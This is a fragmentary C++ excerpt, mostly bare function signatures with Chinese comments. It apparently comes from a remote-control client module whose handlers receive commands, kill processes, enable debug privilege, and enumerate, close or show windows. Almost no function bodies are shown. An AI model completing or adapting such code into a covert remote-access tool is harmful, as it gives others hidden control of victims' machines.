...
CStmM::CStmM(privatra*pClient, BYTE bHow) : Cprotm(pClient)
{
	m_caseSystemIs = bHow;
...
void CStmM::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
...
//结束进程
void CStmM::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
...
BOOL CStmM::DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
...
BOOL CStmM::GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])
{
...
//提权
bool CStmM::DebugPrivilege(const char *PName,BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
...
//窗口回调遍历所有窗口
bool CALLBACK CStmM::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
...
//关闭窗口
void CStmM::CloseTheWindow(LPBYTE buf)
{
	DWORD hwnd;
...
//显示窗口
void CStmM::ShowTheWindow(LPBYTE buf)
{
	DWORD hwnd;
	DWORD dHow;
